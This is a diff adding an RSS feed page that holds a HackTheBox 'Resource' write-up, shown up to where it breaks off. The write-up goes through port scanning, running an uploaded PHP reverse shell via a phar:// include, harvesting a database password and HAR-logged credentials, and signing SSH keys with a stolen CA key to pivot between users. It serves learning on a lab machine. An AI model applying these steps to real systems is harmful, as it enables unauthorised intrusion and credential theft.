@@ -1,0 +1,556 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Har on</title><link>https://h4r1337.github.io/tags/har/</link><description>Recent content in Har on</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Fri, 29 Nov 2024 23:35:37 +0530</lastBuildDate><atom:link href="https://h4r1337.github.io/tags/har/index.xml" rel="self" type="application/rss+xml"/><item><title>Resource | HackTheBox</title><link>https://h4r1337.github.io/posts/resource/</link><pubDate>Fri, 29 Nov 2024 23:35:37 +0530</pubDate><guid>https://h4r1337.github.io/posts/resource/</guid><description>&lt;h3 id="overview">Overview&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/cover.webp">&lt;/figure>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th style="text-align: center">Title&lt;/th>
+&lt;th style="text-align: center">&lt;a href="https://app.hackthebox.com/machines/Resource">Resource&lt;/a>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td style="text-align: center">Difficulty&lt;/td>
+&lt;td style="text-align: center">Hard&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Machine&lt;/td>
+&lt;td style="text-align: center">Linux&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Maker&lt;/td>
+&lt;td style="text-align: center">&lt;a href="https://app.hackthebox.com/users/4935">&lt;img src="https://www.hackthebox.com/badge/image/4935" alt="" style="display: unset">&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;br>
+&lt;div class="alert alert-tip collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-bulb">&lt;/i>
+&lt;p class="alert-heading">
+About Resource
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>Resource is a hard difficulty Linux machine that intricately covers various ways to use &lt;code>OpenSSH&lt;/code> private and public keys. It centers around the &lt;code>SSG IT Resource Center&lt;/code> which offers a ticketing service to address the IT issues (&lt;code>SSH&lt;/code> access, website and security issues, etc. ) of its customers. Upon creating a ticket through the website we can execute Local File Inclusion, trigger a reverse shell and get access to what appears to be a docker container which hosts the ticketing website. From this point, there are various clues in past tickets and left over &lt;code>SSH&lt;/code> artifacts as well as a key signing API service that will lead to pivoting through other users and escaping the docker. Finally, the machine includes various scripts detailing the functions of its ticketing service and key signing API, one of which includes a vulnerable line of code allowing for brute forcing the final &lt;code>SSH&lt;/code> key and achieving full privilege escalation.&lt;/p></description><content>&lt;h3 id="overview">Overview&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/cover.webp">&lt;/figure>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th style="text-align: center">Title&lt;/th>
+&lt;th style="text-align: center">&lt;a href="https://app.hackthebox.com/machines/Resource">Resource&lt;/a>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td style="text-align: center">Difficulty&lt;/td>
+&lt;td style="text-align: center">Hard&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Machine&lt;/td>
+&lt;td style="text-align: center">Linux&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Maker&lt;/td>
+&lt;td style="text-align: center">&lt;a href="https://app.hackthebox.com/users/4935">&lt;img src="https://www.hackthebox.com/badge/image/4935" alt="" style="display: unset">&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;br>
+&lt;div class="alert alert-tip collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-bulb">&lt;/i>
+&lt;p class="alert-heading">
+About Resource
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>Resource is a hard difficulty Linux machine that intricately covers various ways to use &lt;code>OpenSSH&lt;/code> private and public keys. It centers around the &lt;code>SSG IT Resource Center&lt;/code> which offers a ticketing service to address the IT issues (&lt;code>SSH&lt;/code> access, website and security issues, etc. ) of its customers. Upon creating a ticket through the website we can execute Local File Inclusion, trigger a reverse shell and get access to what appears to be a docker container which hosts the ticketing website. From this point, there are various clues in past tickets and left over &lt;code>SSH&lt;/code> artifacts as well as a key signing API service that will lead to pivoting through other users and escaping the docker. Finally, the machine includes various scripts detailing the functions of its ticketing service and key signing API, one of which includes a vulnerable line of code allowing for brute forcing the final &lt;code>SSH&lt;/code> key and achieving full privilege escalation.&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;script>
+function toggleAlert(headerElement) {
+var alertBox = headerElement.parentElement;
+var alertContent = alertBox.querySelector('.alert-content');
+var icon = headerElement.querySelectorAll('i')[1];
+alertBox.classList.toggle('open');
+alertBox.classList.toggle('collapsed');
+if (alertBox.classList.contains('open')) {
+alertContent.style.display = 'block';
+icon.classList.remove('open');
+icon.classList.add('collapsed');
+} else {
+icon.classList.remove('collapsed');
+icon.classList.add('open');
+alertContent.style.display = 'none';
+}
+}
+&lt;/script>
+&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
+&lt;p>Scanned all TCP ports:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nmap -p- -vv --min-rate &lt;span style="color:#d3869b">5000&lt;/span> 10.10.11.27 -oA nmap/ports
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#fe8019">for&lt;/span> itrc.ssg.htb &lt;span style="color:#fe8019">(&lt;/span>10.10.11.27&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up, received syn-ack &lt;span style="color:#fe8019">(&lt;/span>0.27s latency&lt;span style="color:#fe8019">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanned at 2024-08-08 18:56:08 IST &lt;span style="color:#fe8019">for&lt;/span> 1s
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE REASON
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2222/tcp open EtherNetIP-1 syn-ack
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Enumerated open TCP ports:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nmap -p22,80,2222 -vv -sC -sV --min-rate &lt;span style="color:#d3869b">5000&lt;/span> 10.10.11.27 -oA nmap/servce
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#fe8019">for&lt;/span> itrc.ssg.htb &lt;span style="color:#fe8019">(&lt;/span>10.10.11.27&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up, received syn-ack &lt;span style="color:#fe8019">(&lt;/span>0.26s latency&lt;span style="color:#fe8019">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanned at 2024-08-08 18:58:41 IST &lt;span style="color:#fe8019">for&lt;/span> 15s
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE REASON VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh syn-ack OpenSSH 9.2p1 Debian 2+deb12u3 &lt;span style="color:#fe8019">(&lt;/span>protocol 2.0&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http syn-ack nginx 1.18.0 &lt;span style="color:#fe8019">(&lt;/span>Ubuntu&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-cookie-flags:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| /:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| PHPSESSID:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ httponly flag not &lt;span style="color:#fabd2f">set&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD POST OPTIONS
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: nginx/1.18.0 &lt;span style="color:#fe8019">(&lt;/span>Ubuntu&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: IT Support Center
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2222/tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 &lt;span style="color:#fe8019">(&lt;/span>Ubuntu Linux; protocol 2.0&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;h3 id="port-80---http-nginx-1180">Port 80 - HTTP (Nginx &lt;code>1.18.0&lt;/code>)&lt;/h3>
+&lt;p>Forwarding to &lt;code>itrc.ssg.htb&lt;/code>&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240808185634.webp">&lt;/figure>
+&lt;p>Adding that to &lt;code>/etc/hosts&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span> -e &lt;span style="color:#b8bb26">&amp;#39;10.10.11.27\titrc.ssg.htb&amp;#39;&lt;/span> | sudo tee -a /etc/hosts
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240808190008.webp">&lt;/figure>
+&lt;p>Clicking on login redirects us to &lt;code>/?page=login&lt;/code>&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240808190601.webp">&lt;/figure>
+&lt;p>I tried LFI on the &lt;code>page&lt;/code> parameter:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240808190744.webp">&lt;/figure>
+&lt;p>But it redirects us back to the home page. The &lt;code>#&lt;/code> at the end of the url was to bypass potential file extensions like &lt;code>.php&lt;/code> extension that will be added to the page value. I also tried &lt;code>%0a&lt;/code>, &lt;code>%00&lt;/code>, etc. Those were also not working&lt;/p>
+&lt;p>I registered an account and logged in and we can access a dashboard now.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240808191606.webp">&lt;/figure>
+&lt;p>We can create tickets and upload files. This is often the place for XSS, so we can enter some payloads for testing.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809183239.webp">&lt;/figure>
+&lt;p>I tried to use the upload functionality to upload a php reverse shell but that didn&amp;rsquo;t worked. It strictly checks if the upload file is a zip file.
+Next thing I noticed is every ticket have an &lt;code>id&lt;/code> assigned to it, and we can view the contents of the ticket.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809183352.webp">&lt;/figure>
+&lt;p>So I tried IDOR.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809183509.webp">&lt;/figure>
+&lt;p>That wasn&amp;rsquo;t working either, It redirected us to the home page.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809183525.webp">&lt;/figure>
+&lt;p>Then I checked the source code and saw that the value of the &lt;code>id&lt;/code> parameter was reflecting in the js code.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809183812.webp">&lt;/figure>
+&lt;p>We can inject js code through the &lt;code>id&lt;/code> paramter and when the &lt;code>submitComment&lt;/code> function is invoked, that is when we press the comment button our payload will execute.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809184230.webp">&lt;/figure>
+&lt;p>But it is just a self xss, no actual impact. Then again I focused on the upload functionality.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129192411.webp">&lt;/figure>
+&lt;p>The uploaded zip file is placed in the &lt;code>/uploads/&lt;/code>, the server renames the file. I checked if any of the files inside the zip file is extracted in the &lt;code>/uploads&lt;/code> folder but found nothing. If we can somehow execute a php file inside the zip archive we can achieve rce in the server. In php we can use the &lt;a href="https://www.php.net/manual/en/phar.using.stream.php">&lt;code>phar://&lt;/code> wrapper&lt;/a> to execute a php file inside the zip archive we upload. We can use the &lt;code>?page&lt;/code> parameter and give it a &lt;code>phar://&lt;/code> url and see how it responds.&lt;/p>
+&lt;hr>
+&lt;h2 id="exploitation">Exploitation&lt;/h2>
+&lt;h3 id="phar-deserialization">&lt;code>phar://&lt;/code> deserialization&lt;/h3>
+&lt;p>First lets create a zip file with a php reverse shell.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>cp /usr/share/webshells/php/php-reverse-shell.ph shell.php
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">## change ip and port in shell.php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">## then create the zip file&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>zip -r poc.zip shell.php
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now upload the &lt;code>poc.zip&lt;/code> and execute the &lt;code>shell.php&lt;/code> by sending a request to:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>http://itrc.ssg.htb/?page=phar://uploads/83ffc3c94d5736acfff31d7092fed6d6dcf414cd.zip/shell
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>And we got the shell&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809185821.webp">&lt;/figure>
+&lt;hr>
+&lt;h2 id="lateral-movement-to-user">Lateral Movement to user&lt;/h2>
+&lt;h3 id="local-enumeration">Local Enumeration&lt;/h3>
+&lt;p>There is a &lt;code>.dockerenv&lt;/code> file in the root directory, indicating that we are inside a docker container.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809191810.webp">&lt;/figure>
+&lt;p>I checked the &lt;code>/var/www/itrc&lt;/code> directory and saw a &lt;code>db.php&lt;/code> file&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">&amp;lt;?&lt;/span>php
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$dsn &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;mysql:host=db;dbname=resourcecenter;&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$dbusername &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;jj&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$dbpassword &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;ugEG5rR5SG8uPd&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$pdo &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#fe8019">new&lt;/span> PDO($dsn, $dbusername, $dbpassword);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">try&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $pdo&lt;span style="color:#fe8019">-&amp;gt;&lt;/span>&lt;span style="color:#b8bb26;font-weight:bold">setAttribute&lt;/span>(PDO&lt;span style="color:#fe8019">::&lt;/span>&lt;span style="color:#b8bb26;font-weight:bold">ATTR_ERRMODE&lt;/span>, PDO&lt;span style="color:#fe8019">::&lt;/span>&lt;span style="color:#b8bb26;font-weight:bold">ERRMODE_EXCEPTION&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#fe8019">catch&lt;/span> (PDOException $e) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">die&lt;/span>(&lt;span style="color:#b8bb26">&amp;#34;Connection failed: &amp;#34;&lt;/span> &lt;span style="color:#fe8019">.&lt;/span> $e&lt;span style="color:#fe8019">-&amp;gt;&lt;/span>&lt;span style="color:#b8bb26;font-weight:bold">getMessage&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>But we can&amp;rsquo;t connect to mysql.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809190108.webp">&lt;/figure>
+&lt;p>Maybe we can ssh directly into the host machine using the credential?&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129193523.webp">&lt;/figure>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129193539.webp">&lt;/figure>
+&lt;p>And that wasn&amp;rsquo;t working either.&lt;/p>
+&lt;p>Before moving on I checked the &lt;code>index.php&lt;/code> file to investigate why the &lt;code>phar://&lt;/code> attack worked and why the path traversal didn&amp;rsquo;t:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">&amp;lt;?&lt;/span>php session_start();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> (isset($_GET[&lt;span style="color:#b8bb26">&amp;#34;page&amp;#34;&lt;/span>]) &lt;span style="color:#fe8019">and&lt;/span> file_exists($_GET[&lt;span style="color:#b8bb26">&amp;#34;page&amp;#34;&lt;/span>] &lt;span style="color:#fe8019">.&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;.php&amp;#34;&lt;/span>)){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $page &lt;span style="color:#fe8019">=&lt;/span> $_GET[&lt;span style="color:#b8bb26">&amp;#34;page&amp;#34;&lt;/span>] &lt;span style="color:#fe8019">.&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;.php&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#fe8019">elseif&lt;/span> (isset($_SESSION[&lt;span style="color:#b8bb26">&amp;#34;username&amp;#34;&lt;/span>])) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $page &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;dashboard.php&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#fe8019">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $page &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;home.php&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">require_once&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;header.inc.php&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&amp;lt;div class=&lt;/span>&lt;span style="color:#b8bb26">\&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">main&lt;/span>&lt;span style="color:#b8bb26">\&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">&amp;gt;&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">include_once&lt;/span> $page;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&amp;lt;/div&amp;gt;&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">require_once&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;footer.inc.php&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">?&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It appends &lt;code>.php&lt;/code> to the value of &lt;code>page&lt;/code> parameter and checks if that file exists in the server using &lt;code>file_exists()&lt;/code> function. That&amp;rsquo;s why we were not able to read &lt;code>/etc/passwd&lt;/code> file before, because even if we add a &lt;code>#&lt;/code> at the end the &lt;code>file_exists(&amp;quot;../../../../etc/passwd#.php&amp;quot;)&lt;/code> check will fail. This is not that secure because we can perform path traversal and include &lt;code>php&lt;/code> files in other folders like &lt;code>../../test.php&lt;/code>. But including &lt;code>php&lt;/code> files already in the server doesn&amp;rsquo;t help us get a shell. Also the server strictly checks the uploaded file is a &lt;code>zip&lt;/code> file. So 0xdf, creator of the challenge chained this with a &lt;code>phar://&lt;/code> deserialization attack. cool&amp;hellip;
+After a lot of enumeration I couldn&amp;rsquo;t find anything useful. Then I checked the &lt;code>uploads/&lt;/code> directory and filtered all the &lt;code>zip&lt;/code> files to check if there&amp;rsquo;s anything interesting.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809191048.webp">&lt;/figure>
+&lt;p>It&amp;rsquo;s a &lt;a href="https://en.wikipedia.org/wiki/HAR_(file_format)">HAR&lt;/a> file:&lt;/p>
+&lt;div class="alert alert-note ">
+&lt;div class="alert-heading-box" >
+&lt;i class="bx bx-info-circle">&lt;/i>
+&lt;p class="alert-heading">
+What&amp;rsquo;s a HAR file?
+&lt;/p>
+&lt;/div>
+&lt;div class="alert-content" >
+&lt;p>The &lt;strong>HTTP Archive&lt;/strong> format, or &lt;strong>HAR&lt;/strong>, is a JSON-formatted archive file format for logging of a web browser&amp;rsquo;s interaction with a site. The common extension for these files is &lt;strong>.har&lt;/strong>.&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;script>
+function toggleAlert(headerElement) {
+var alertBox = headerElement.parentElement;
+var alertContent = alertBox.querySelector('.alert-content');
+var icon = headerElement.querySelectorAll('i')[1];
+alertBox.classList.toggle('open');
+alertBox.classList.toggle('collapsed');
+if (alertBox.classList.contains('open')) {
+alertContent.style.display = 'block';
+icon.classList.remove('open');
+icon.classList.add('collapsed');
+} else {
+icon.classList.remove('collapsed');
+icon.classList.add('open');
+alertContent.style.display = 'none';
+}
+}
+&lt;/script>
+&lt;p>Since it logs all the interactions, we can check for leaked login credentials in this file, and we found one&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809191638.webp">&lt;/figure>
+&lt;p>It&amp;rsquo;s definitely a user in the machine&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809191735.webp">&lt;/figure>
+&lt;h3 id="lateral-movement---user-msainristil">Lateral Movement - user msainristil&lt;/h3>
+&lt;p>The container is running &lt;code>sshd&lt;/code> so we can try ssh into the user with the password&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809192052.webp">&lt;/figure>
+&lt;p>And it works&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809192137.webp">&lt;/figure>
+&lt;p>There is a &lt;code>decommission_old_ca&lt;/code> directory in the home&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809192355.webp">&lt;/figure>
+&lt;p>And it&amp;rsquo;s actually a &lt;a href="https://www.lorier.net/docs/ssh-ca.html">Certification Authority key&lt;/a>&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809192513.webp">&lt;/figure>
+&lt;h3 id="lateral-movement---user-zzinter">Lateral Movement - user zzinter&lt;/h3>
+&lt;p>You can check the website I linked above or the &lt;code>CERTIFICATES&lt;/code> section in the man page of &lt;code>ssh-keygen&lt;/code> to learn more about this.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809195007.webp">&lt;/figure>
+&lt;p>So basically we can sign ssh keys for the users in the machine using this CA.
+Fi./rst we have to copy the private key &lt;code>ca-itrc&lt;/code> to our local machine. Then create an ssh key pair, and sign it using the CA key for the user &lt;code>zzinter&lt;/code> on the machine.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>chmod &lt;span style="color:#d3869b">600&lt;/span> ca-itrc
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ssh-keygen -t rsa -f ctf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ssh-keygen -s ca-itrc -I &lt;span style="color:#b8bb26">&amp;#34;zzinter@itrc user key&amp;#34;&lt;/span> -n &lt;span style="color:#b8bb26">&amp;#34;zzinter&amp;#34;&lt;/span> ./ctf.pub
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;br>
+&lt;div class="alert alert-note collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-info-circle">&lt;/i>
+&lt;p class="alert-heading">
+Explantion
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>First we create a ssh key pair &lt;br>
+&lt;code>-t rsa&lt;/code> is to set the type of the key to &lt;code>rsa&lt;/code>&lt;br>
+&lt;code>-f&lt;/code> is to specify the name of the file&lt;br>
+Then we sign the public key using the CA certificate&lt;br>
+&lt;code>-s&lt;/code> specifies the CA certificate&lt;br>
+&lt;code>-I&lt;/code> it should be in the format &lt;code>user@hostname user key&lt;/code>&lt;br>
+&lt;code>-n&lt;/code> specifies the username&lt;br>&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;script>
+function toggleAlert(headerElement) {
+var alertBox = headerElement.parentElement;
+var alertContent = alertBox.querySelector('.alert-content');
+var icon = headerElement.querySelectorAll('i')[1];
